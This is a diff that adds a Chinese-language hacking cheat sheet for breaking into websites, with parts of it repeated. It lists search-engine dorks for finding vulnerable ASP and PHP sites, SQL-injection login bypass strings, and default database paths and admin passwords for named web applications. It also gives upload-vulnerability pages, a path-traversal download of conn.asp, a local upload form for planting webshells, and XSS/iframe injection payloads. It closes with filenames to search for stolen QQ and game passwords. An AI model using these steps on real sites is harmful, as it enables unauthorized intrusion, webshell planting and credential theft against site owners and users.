@@ -1,0 +1,607 @@
+inurl:MtvID=?
+inurl:b2b_cplist asp
+
+
+asp?id=1  一般注入点
+asp?id=2 
+inurl:asp?id=1
+inurl:asp?id=2
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or 'a'='a
+" or "a"="a
+网***' or 1=1--
+
+1,
+到GoogLe,搜索一些关键字,edit.asp?                       
+
+2,
+到Google ,site:cq.cn inurl:asp
+
+3,
+利用挖掘鸡和一个ASP木马.
+文件名是login.asp
+路径组是/manage/
+关键词是went.asp
+用'or'='or'来登陆
+
+4,
+关键字：Co Net MIB Ver 1.0网站后台管理系统
+
+帐号密码为                     'or'='or'
+
+
+5.
+动感购物系统
+                     inurl:help.asp登陆，如未注册成为会员!
+
+upLoad_bm1.asp和upLoad_c1.asp这两个随便选个，一般管理员都忽视了这2漏洞
+
+
+6。
+默认数据库地址blogdata/acblog.asa
+                       关键字：acblog
+
+7.
+百度 /htdocs
+                     注册里可以直接上传asa文件！
+
+
+8.
+/Database/#newasp.mdb
+关键词：NewAsp SiteManageSystem Version
+
+
+9.
+用挖掘机               
+关键字：Powered by WEBBOY
+页面：/upfile.asp
+
+10.
+baidu中搜索关键字Ver5.0 Build 0519
+(存在上传漏洞)
+
+11.
+Upfile_Article.asp                     bbs/upfile.asp 
+输入关键字：powered by mypower ，
+
+12.
+inurl:winnt\system32\inetsrv\ 在google里面输入这个就可以找到很多网站
+
+13.
+现在GOOGLE搜索关键字                         intitle:网站小助手　inurl:asp 
+
+14.
+键字： 首页 最新动态 新手指南 舞曲音乐 下载中心 经典文章 玩家风采 装备购买 站内流言 友情连接 本站论坛
+
+挖掘鸡的关键字 添                       setup.asp
+
+
+15.
+VBulletin论坛的数据库
+默认数据库地址!
+/includes/functions.php
+工具:
+1.网站猎手                     下载地址:百度 Google!
+2.Google
+关键字:
+Powered by: vBulletin Version 3.0.1
+Powered by: vBulletin Version 3.0.2
+Powered by: vBulletin Version 3.0.3
+其中一个就可以了
+
+16.
+1.打开百度或GOOGLE搜索，输入powered by comersus ASP shopping cart 
+open source。 这是一个商场系统。
+2.网站的最底部分，有个 Comersus Open Technologies LC。打开看下~~comersus系统~
+猜到,comersus.mdb. 是数据库名
+数据库都是放在database/ 后的,
+所以database/comersus.mdb 
+comersus_listCategoriesTree.asp换成database/comersus.mdb，不能下载。
+那样把前一个''store/''除去，再加上database/comersus.mdb                     试试
+
+17.
+无忧传奇官方站点程序。
+                             1、后台管理地址：http://您的域名/msmiradmin/
+                             2、默认后台管理帐号：msmir
+                             3、默认后台管理密码：msmirmsmir
+数据库文件为 http://您的域名/msmirdata/msmirArticle.mdb
+数据库连接文件为 ***********/Conn.asp
+
+18.
+百度里输入/skins/default/
+
+19.
+利用挖掘机
+关键机:power by Discuz
+路径:/wish.php
+配合:
+Discuz!论坛 wish.php远程包含漏洞   工具使用
+
+20.
+上传漏洞.
+工具 : Domain3.5
+                           网站猎手 1.5版
+关键字powered by mypower
+检测的页面或文件插入upfile_photo.asp
+
+
+21.
+新云漏洞
+这个漏洞ACCESS和SQL版通吃。
+Google搜索关键字 "关于本站 - 网站帮助 - 广告合作 - 下载声明 - 友情连接 - 网站地图 - 管理登录"
+把flash/downfile.asp?url=uploadfile/../../conn.asp提交到网站根目录。就可以下载conn.asp
+以源码，软件等下载站居多。
+大家时常碰到数据库如果前面或者中间+了# 可以用%23替换就可以下载了
+\database\%23newasp.mdb
+如：#xzws.mdb 改成%23xzws.mdb
+
+22.
+通吃所有商城+动力上传系统
+
+使用工具:挖掘鸡 v1.1                     明小子
+商城入侵:
+关键字:选购->加入购物车->去收银台->确认收货人信息->选付款方式->选配送方式->在线支付或下单后汇款->汇款确认->发货->完成
+漏洞页面:upload.asp   
+                             upfile_flash.asp
+
+动力入侵:
+关键字:powered by mypower
+漏洞页面:upfile_photo.asp
+                             Upfile_Soft.asp
+                             upfile_adpic.asp
+                             upfile_softpic.asp
+
+23.
+注射漏洞
+百度搜索:oioj's blog
+
+24
+动易
+列目录
+admin_articlerecyclebin.asp 
+inurl:admin_articlerecyclebin.asp 
+
+25.
+工具:网站猎手
+关键词:inurl:Went.asp
+后缀:manage/login.asp
+口令:'or'='or'
+
+26.
+入侵魔兽私服
+需要的工具：ASP木马一只。
+                               Domain3.5明小子
+关键字：All Right Reserved Design:游戏联盟
+后台地址：admin/login.asp
+数据库的地址：chngame/#chngame.mdb
+
+27.
+漏洞是利用管理员iis设置的失误
+用baidu 关键字就是比较罕见的脚本名
+动网:                     ReloadForumCache.asp
+Leadbbs:                     makealltopanc.asp
+BBSXP:                     admin_fso.asp
+动易:                     admin_articlerecyclebin.asp
+
+28.
+国外站的爆库漏洞
+关键字：sad Raven's Guestbook
+密码地址:/passwd.dat
+后台地址:/admin.php
+
+29.
+Discuz 4.1.0跨站漏洞
+利用工具:1,WAP浏览器
+                             2,WAP编码转换器
+关键字:"intext:Discuz! 4.1.0"
+
+30.
+关键字：尚奈克斯
+后台路径/system/manage.asp 
+直接传ASP木马
+
+31.
+工具
+1:网站猎手
+2:大马一个
+关键字:切勿关闭Cookies功能，否则您将不能登录
+插入diy.asp
+
+32.
+关键字:Team5 Studio All rights reserved
+默认数据库:data/team.mdb 
+
+33.
+工具:                         挖掘机 辅臣数据库读取器
+关键字:                       企业简介 产品展示 产品列表
+后缀添加: /database/myszw.mdb
+后台地址: admin/Login.asp
+
+34.
+关键子                       XXX inurl:Nclass.asp
+在"系统设置"里写个木马。
+会被保存到 在 config.asp内。
+
+35.
+不进后台照样拿动网WEBSHELL
+data.asp?action=BackupData                             动网数据库备份默认路径
+
+36.
+工具:网站猎手                     WebShell
+关键字:inurl:Went.asp
+后缀:manage/login.asp
+弱口令:'or'='or'
+
+37.
+关键字:Powered by:QCDN_NEWS
+随便扫遍文章加一个' ,来试探注入点
+后台地址:admin_index.asp
+
+38.
+入侵雷池新闻发布系统
+关键字:leichinews
+去掉leichinews后面的.
+打上:admin/uploadPic.asp?actionType=mod&picName=xuanran.asp
+再上传马.....
+进访问uppic anran.asp 登陆马.
+
+39.
+关键字:Power System Of Article Management Ver 3.0 Build 20030628
+默认数据库:database\yiuwekdsodksldfslwifds.mdb  
+后台地址:自己扫描!
+
+40.
+一、通过GOOGLE搜索找大量注入点
+关键字：asp?id=1                         gov.jp/ asp?id=
+页数：100
+语言：想入侵哪个国家就填什么语言吧
+
+41.
+关键字：Powered by:94KKBBS 2005
+利用密码找回功能 找回admin
+提问:ddddd 回答:ddddd
+
+42.
+关键字:inurl:Went.asp
+后台为manage/login.asp
+后台密码: 'or'=' 或者 'or''=''or' 登录　进入
+默认数据库地址:Database/DataShop.mdb
+
+43.
+关键字:六合彩 inurl:readnews.asp
+把最后一个/改成%5c ,直接暴库,看密码,进后台
+随便添加个新闻 在标题输入我们的一句话木马
+
+44.
+工具:一句话木马
+                         BBsXp 5.0 sp1 管理员猜解器
+关键词:powered by bbsxp5.00
+进后台,备份一句话马!
+
+45.
+关键字：程序核心：BJXSHOP网上开店专家 
+后台:/admin  
+
+46.
+
+                             1 挖掘鸡    
+                             2 asp木马(要免杀哦)   
+                             3 自制的本地上传页面                   重要的哦！
+挖掘机输入以下：
+            
+关键字：格式0791-6274752/或0791-6274752重要的是懂得举一反三
+
+
+后缀名：upfile_other.asp
+
+先注册个号然后上传
+
+本地上传页面代码
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0055)http://www.junda888.com/upload.asp -->
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<STYLE type=text/css>BODY {
+FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee
+}
+.tx1 {
+BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px
+}
+</STYLE>
+
+
+<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>
+<BODY leftMargin=0 topMargin=0>
+<FORM name=form1 action="地址/upfile_other.asp" method=post 
+encType=multipart/form-data><INPUT class=tx1 type=file size=30 name=FileName> <INPUT class=tx1 type=file size=30 name=FileName1> <INPUT style="BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP: rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt; BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal; BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal; FONT-VARIANT: normal" type=submit value=上传 name=Submit> 
+<INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID> </FORM></BODY></HTML>
+
+47.
+
+工具：1》网站猎手2.0
+                       2》一句话木马
+                       3》一句话木马客户端增强版
+
+搜索inurl：hack.asp
+
+添加system/mdb/system.asp
+
+它的数据库 我们在注册的时候 添写我们的一句话木马
+
+然后连接`~
+
+
+跨站~~</textarea><Meta http-equiv="refresh" content="3;url='http://bbs.ghkcn.cn' "><textarea>
+
+
+</title><iframe src=http://www.hackfeng.com width=999 height=999></iframe><title>
+
+48
+
+挖掘鸡               ASP马               辅臣数据库浏览器 1.0                 还有网站
+http://www.cmd5.com/default.aspx
+
+关键词               power by shotan                 数据库 database/shotan.mdb
+
+49
+
+
+需要的工具:网站猎手
+                       明小子或辅臣数据浏览器
+                       ASP`大马.小马
+
+关键字:专题二最新文章
+
+后辍名:数据库路径：/database/PowerEasy2006.mdb
+                   后台路径：/admin/Admin_Login.asp
+50.工具准备：网站猎手
+关键字：wodig.com, all rights 
+默认数据库：wodb\2006wodig2.asp
+
+51
+
+CompHonorBig.asp?id=
+
+52
+
+ProductShow.asp?ArticleID=
+                           可找到这样的站
+                                   找upfile_Other.asp 
+
+53
+
+inurl:sc.asp
+
+54 \
+
+inurl:/manage/Login.asp 公司后台
+55 
+
+关键字输入
+选购->加入购物车->去收银台->确认收货人信息->选付款方式->选配送方式->在线支付或下单后汇款->汇款确认->发货->完成 
+我们选upload.asp
+
+56
+
+数据库名称：scadata.mdb
+数据目录：data/scadata.mdb
+
+关键字:本站部分信息由企业自行提供,该企业负责信息内容的真实性、准确性和合法性 
+
+企业会员 商贸机会 产品展示 行业新闻 展会信息
+
+57
+
+
+Powered by:MyPower Ver3.51，选择30页，搜索
+
+
+看操作，插入upfile_article.asp
+
+
+58 inurl: (asp?=1471)
+admin/login.asp
+/admin.upfile_flash.asp
+
+/upfile_flash.asp 商城动态
+upfile_soft.asp商城动态
+upfile_soft.asp商城动态
+upfile.asp
+
+后缀：/admin/myup.asp
+   关键词：你对本站的第一印象如何？  
+
+
+关键字：预定帮助系统
+后缀名：admin/login.asp
+
+'or'='or'
+
+
+
+添加后缀/db/com02.mdb
+关键字企业邮局企业荣誉营销网络产品分类信息反馈联系
+
+
+
+SuperMan:
+
+
+关键字：ProductShow.asp?ArticleID=
+          增加：upfile_Other.asp   页面
+
+关 键 字 : acblog 
+
+漏洞利用 : blogdata/acblog.asa
+
+
+关键字:inurl:2j.asp?
+后缀：BBS/database/bbsxp7.mdb
+bbs/data/dvbbs7.mdb
+
+
+关键字：Power WenDay Ver1.0
+添加： /db/PW_SYS_Data.mdb
+关键字：powered by WEBBOY
+添加： /upfile.asp 
+关键字：Powered By ：SMT Version 5.0
+添加： /bbs/upfile.asp /upfile_flash.asp 
+关键字：team5 studio all rights reserved
+添加： /data/team.mdb
+关键字：传奇私服
+添加： /msmirdata/msmirArticle.mdb(默认数据库) 
+后台管理地址:http;//您的域名/msmiradmin/
+关键字:同城约会 贺卡传情 情感随笔 热门投票
+添加: /admin/upload_file.asp (明小子上传)
+关键字: 公司后台
+添加： /manage/Login.asp （用"or"="or"）
+关键字：企业邮局 企业荣誉 营销网络 产品分类 信息反馈 联系我们 收藏本站 网站管理 
+添加： /admin/login.asp (后台管理地址,管理员帐号密码=admin)
+关键字：by wygk
+添加：/data/scadata.mdzhaozhon
+关键字: Power System Of Article Management Ver 3.0 Build 20030628
+添加: /database\yiuwekdsodksldfslwifds.mdb (后台的后缀全是/admin_index.asp)
+
+关键字: Foosun
+添加: /Foosun_Data/FS400.mdbAdmin/login.asp (后台的后缀全是admin/login.asp)
+关键字：Powered By Kesion Inc
+默认数据库 ks_data/ks_database.mdb
+关键字： inurl:qq.txt （啊拉）
+inurl:Mz.txt （极限居）
+inurlQCJB.txt （QQ冲击波）
+inurl:qqnum.txt （完美）
+1、如在网站中找到诸如：“请登录后再使用本功能！”这样的就可以用明小子上传试试
+2、使用明小子上传时选择“动力上传漏洞—/upfile_softpic.asp页面”
+
+明小子关键词：
+1.ProductShow.asp?ArticleID=
+2.inurl:show_news.asp?id=
+3.site inurl:Article_Print.asp
+9.4.edit.asp?
+5.site:cq.cn inurl:asp
+6.intitle:网站小助手
+7.powered by comersus ASP shopping cart
+open source
+8./skins/default/
+9.动力上传系统
+10.oioj's blog
+11.动网: ReloadForumCache.asp
+12."intext:Discuz! 4.1.0"
+13.尚奈克斯
+14.Team5 Studio All rights reserved
+15.XXX inurl:Nclass.asp
+16.Powered by:QCDN_NEWS
+17.发布系统
+18.asp?id=1
+19.Powered by:94KKBBS 2005
+20.inurl:readnews.asp
+21.程序核心
+经典的用户名密码
+'or'='or'
+'or'1'='1
+这2个密码在很多网站后台,QQ空间相册都可以登陆,不过不是100%而已....
+inurl: 用于搜索网页上包含的URL. 这个语法对寻找网页上的搜索,帮助之类的很有用.
+intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题,URL等的文字).
+site: 可以限制你搜索范围的域名.
+filetype: 搜索文件的后缀或者扩展名
+intitle: 限制你搜索的网页标题.
+allintitle: 搜索所有关键字构成标题的网页. 但是推荐不要使用
+link: 可以得到一个所有包含了某个指定URL的页面列表. 例如link:www.google.com 就可以得到所有连接到Google的页面
+===================================================================================
+intext:管理
+filetype:mdb
+inurl:file
+site:xx.com filetype:txt 查找TXT文件 其他的依次内推
+site:xx.com intext:管理
+site:xx.com inurl:login
+site:xx.com intitle:后台
+查看服务器使用的程序
+site:xx.com filetype:asp
+site:xx.com filetype:php
+site:xx.com filetype:jsp
+查看上传漏洞：
+site:xx.com inurl:file
+site:xx.com inurl:load
+查找注射点：
+site:xx.com filetype:asp
+site:tw inurl:asp?id= 这个是找台湾的
+或
+site:jp inurl:asp?id= 这个是找日本的
+或
+site:ko inurl:asp?id= 这个是找韩国的
+依次类推
+
+1、如在网站中找到诸如：“请登录后再使用本功能！”这样的就可以用明小子上传试试
+2、使用明小子上传时选择“动力上传漏洞—/upfile_softpic.asp页面”
+pwd.asp
+pwd.txt
+123.asp
+123.txt
+qqhao.txt
+qqhao.asp
+qqmima.asp
+qqmima.txt
+qq.txt
+qq.asp
+关键字就要自己想些独特一点的 如果都去扫那些什么 免费 QB 什么的 那都是别人扫剩下的 你拿来也没用 记得一定要独特 比如收号 信箱 等等 充分发挥你的想象空间
+
+
+
+关键字：Power WenDay Ver1.0
+添加： /db/PW_SYS_Data.mdb
+关键字：powered by WEBBOY
+添加： /upfile.asp 
+关键字：Powered By ：SMT Version 5.0
+添加： /bbs/upfile.asp /upfile_flash.asp 
+关键字：team5 studio all rights reserved
+添加： /data/team.mdb
+关键字：传奇私服
+添加： /msmirdata/msmirArticle.mdb(默认数据库) 
+后台管理地址:http;//您的域名/msmiradmin/
+关键字:同城约会 贺卡传情 情感随笔 热门投票
+添加: /admin/upload_file.asp (明小子上传)
+关键字: 公司后台
+添加： /manage/Login.asp （用"or"="or"）
+关键字：企业邮局 企业荣誉 营销网络 产品分类 信息反馈 联系我们 收藏本站 网站管理 
+添加： /admin/login.asp (后台管理地址,管理员帐号密码=admin)
+关键字：by wygk
+添加：/data/scadata.mdb
+关键字: Power System Of Article Management Ver 3.0 Build 20030628
+添加: /database\yiuwekdsodksldfslwifds.mdb (后台的后缀全是/admin_index.asp)
+
+关键字: Foosun
+添加: /Foosun_Data/FS400.mdbAdmin/login.asp (后台的后缀全是admin/login.asp)
+关键字：Powered By Kesion Inc
+默认数据库 ks_data/ks_database.mdb
+关键字： inurl:qq.txt （啊拉）
+inurl:Mz.txt （极限居）
+inurlQCJB.txt （QQ冲击波）
+inurl:qqnum.txt （完美） 
+
+传奇服务端：
+cq.rar
+cq2.rar
+mir.rar
+mir2.rar
+server.rar
+cqserver.rar
+mir2.bak
+热血江湖：
+jhpass.txt
+rxjh.txt
+rxjh.asp
+rxjhname.txt
+网游猎手(26in1)网络游戏木马生成器：
+wddata.mdb
+MYasp/lin.asp
+88088186.asp
+QQ:
+mypass.txt
+myqqpass.txt
+qqhao.txt
+ganqq.txt
+daoqq.txt
+inurl: /admin.asp intex :管理员
